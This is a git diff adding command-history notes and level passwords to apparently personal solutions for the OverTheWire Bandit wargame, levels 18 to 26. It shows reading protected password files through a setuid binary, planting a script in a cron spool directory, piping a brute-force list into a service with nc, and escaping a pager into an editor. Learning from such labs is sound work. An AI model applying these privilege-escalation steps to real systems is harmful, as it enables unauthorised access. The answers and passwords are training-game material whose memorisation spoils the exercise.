@@ -171,9 +171,86 @@ ktfgBvpMzWKR5ENj26IbLGSblgUG9CzB
 
 # level 18->19:
 
+1. ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
 cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
 
 # level 19->20:
 
-./bandit20-do cat /etc/bandit_pass/bandit20
+    1  ./bandit20-do
+    2  ./bandit20-do id
+    3  ./bandit20-do ls
+    4  ./bandit20-do cat /etc/bandit_pass/bandit20
+    5  history
+    
 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+
+# level 20->21:
+    1  nc -lvp 9999
+    1  ./suconnect
+    2  ./suconnect 9999
+
+EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+
+# level 21->22:
+
+ 1  ls
+    2  cd /etc/cron.d/
+    3  ls
+    4  cat cronjob_bandit22
+    5  cat /usr/bin/cronjob_bandit22.sh
+    6  cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+
+# level 22->23:
+
+ 1  cd /etc/cron.d
+    2  ls
+    3  cat cronjob_bandit23
+    4  cat /usr/bin/cronjob_bandit23.sh
+    5  echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+    6  cat /tmp/8ca319486bfbbc3663ea0fbe81326349 
+
+  0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+# level 23->24:
+
+   1  ls -la /etc/cron.d/
+   2  cat /etc/cron.d/cronjob_bandit24
+   3  cat /usr/bin/cronjob_bandit24.sh
+   4  cd /var/spool/bandit24/foo
+   5  echo "cat /etc/bandit_pass/bandit24 > /tmp/socorro.txt" > socorro.sh
+   6  chmod 777 socorro.sh
+   7  cat /tmp/socorro.txt
+
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+# level 24->25:
+
+  1  nc localhost 30002
+    2  mkdir /tmp/brute
+    3  mkdir /tmp/bruto
+    4  cd /tmp/bruto
+    5  nano list.txt
+    6  la
+    7  cat list.txt | nc localhost 30002
+    8  rm list.txt
+    9  nano script.sh
+   10  ls
+   11  chmod +x script.sh
+   12  ls
+   13  ./script.sh
+   14  cat list.txt | nc localhost 30002
+
+ iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+# level 25->26:
+//minimizar ventana
+
+1 ssh bandit26@localhost -i bandit26.sshkey -p2220
+2 v
+3 :e /etc/bandit_pass/bandit26
+s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+
+
+
